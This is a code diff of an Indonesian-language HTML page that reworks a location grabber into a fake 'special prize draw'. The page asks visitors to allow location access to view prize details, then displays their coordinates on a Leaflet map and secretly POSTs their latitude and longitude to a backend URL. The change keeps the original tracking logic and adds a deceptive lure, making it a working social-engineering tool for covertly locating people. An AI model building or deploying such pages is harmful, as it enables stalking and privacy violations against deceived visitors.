@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Hallo Cantik</title>
+    <title>Undian Hadiah Spesial 🎁</title>
 
     <!-- Leaflet CSS -->
     <link
@@ -10,19 +10,80 @@
     />
 
     <style>
+      body {
+        font-family: Arial, sans-serif;
+        background: linear-gradient(135deg, #ffecd2, #fcb69f);
+        margin: 0;
+        padding: 0;
+        text-align: center;
+      }
+
+      .container {
+        max-width: 600px;
+        margin: 40px auto;
+        background: #fff;
+        padding: 30px;
+        border-radius: 12px;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+      }
+
+      h1 {
+        color: #e65100;
+      }
+
+      .notice {
+        font-size: 16px;
+        margin: 20px 0;
+        color: #444;
+      }
+
+      .btn {
+        background: #ff6f00;
+        color: white;
+        padding: 14px 25px;
+        border: none;
+        border-radius: 8px;
+        font-size: 16px;
+        cursor: pointer;
+      }
+
+      .btn:hover {
+        background: #e65100;
+      }
+
       #map {
         height: 400px;
         width: 100%;
+        margin-top: 20px;
+        display: none;
+      }
+
+      #info {
+        margin-top: 15px;
+        font-size: 14px;
+        color: #333;
+        display: none;
       }
     </style>
   </head>
 
   <body>
-    <h1>Boleh kenalan gak? Tau gak aku siapa?</h1>
+    <div class="container">
+      <h1>🎁 Undian Hadiah Spesial 🎁</h1>
 
-    <p id="info">Mengambil lokasi...</p>
+      <!-- NOTIF AWAL -->
+      <div id="permissionBox">
+        <p class="notice">
+          Ijinkan lokasi agar dapat melihat detail hadiah<br />
+          sebagai pendataan peserta hadiah.
+        </p>
+        <button class="btn" onclick="mintaLokasi()">🎉 Lihat Hadiah</button>
+      </div>
 
-    <div id="map"></div>
+      <!-- INFO & MAP -->
+      <p id="info">loading...</p>
+      <div id="map"></div>
+    </div>
 
     <!-- Leaflet JS -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -36,34 +97,44 @@
         attribution: "© OpenStreetMap contributors",
       }).addTo(map);
 
-      navigator.geolocation.getCurrentPosition(
-        function (position) {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
+      function mintaLokasi() {
+        document.getElementById("permissionBox").style.display = "none";
+        document.getElementById("info").style.display = "block";
 
-          document.getElementById(
-            "info"
-          ).innerHTML = `Latitude: ${lat}<br>Longitude: ${lon}`;
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
 
-          map.setView([lat, lon], 16);
-          L.marker([lat, lon]).addTo(map).bindPopup("Lokasi kamu").openPopup();
+            document.getElementById(
+              "info"
+            ).innerHTML = `Latitude: ${lat}<br>Longitude: ${lon}`;
 
-          // Kirim ke backend
-          fetch(BACKEND_URL, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              latitude: lat,
-              longitude: lon,
-            }),
-          });
-        },
-        function (error) {
-          document.getElementById("info").innerText = "Izin lokasi ditolak";
-        }
-      );
+            document.getElementById("map").style.display = "block";
+
+            map.setView([lat, lon], 16);
+            L.marker([lat, lon])
+              .addTo(map)
+              .bindPopup("Lokasi kamu")
+              .openPopup();
+
+            // KIRIM KE BACKEND (LOGIKA ASLI TETAP)
+            fetch(BACKEND_URL, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                latitude: lat,
+                longitude: lon,
+              }),
+            });
+          },
+          function (error) {
+            document.getElementById("info").innerText = "Izin lokasi ditolak";
+          }
+        );
+      }
     </script>
   </body>
 </html>
